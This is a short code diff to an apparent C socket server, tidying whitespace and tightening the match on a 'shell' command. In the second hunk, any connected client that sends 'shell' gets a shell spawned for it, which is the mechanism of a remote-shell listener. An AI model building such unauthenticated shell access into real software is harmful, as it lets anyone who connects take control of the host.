@@ -260,7 +260,7 @@ int handle_commands(fd_set *readfds, int *clients_sockets)
 	for (int i = 0; i < MAX_CLIENTS; i++)  
 	{
 		sd = clients_sockets[i];  
-		if (FD_ISSET(sd , readfds))  
+		if (FD_ISSET(sd, readfds))  
 		{
 			//Check if it was for closing , and also read the incoming message 
 			if ((valread = read(sd, buffer, 1024)) == 0)
@@ -275,7 +275,7 @@ int handle_commands(fd_set *readfds, int *clients_sockets)
 				//set the string terminating NULL byte on the end of the data read 
 				buffer[valread] = 0;
 				// handle shell command
-				if (strncmp(buffer, "shell", 5) == 0)
+				if (strcmp(buffer, "shell\n") == 0)
 				{
 					int ret = spawn_shell(&clients_sockets[i]);
 					if (ret)
